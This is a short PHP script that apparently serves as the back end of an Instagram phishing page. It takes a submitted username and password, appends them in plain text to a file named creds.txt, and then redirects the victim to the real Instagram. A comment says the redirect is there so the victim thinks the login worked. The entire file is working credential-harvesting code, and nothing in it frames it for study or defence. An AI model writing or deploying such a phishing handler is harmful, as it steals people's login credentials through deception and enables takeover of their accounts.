<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // Saves the data to a file named creds.txt
    $file = fopen("creds.txt", "a");
    fwrite($file, "Username: $user\nPassword: $pass\n\n");
    fclose($file);

    // Redirects user to real Instagram so they think it worked
    header("Location: https://www.instagram.com/");
}
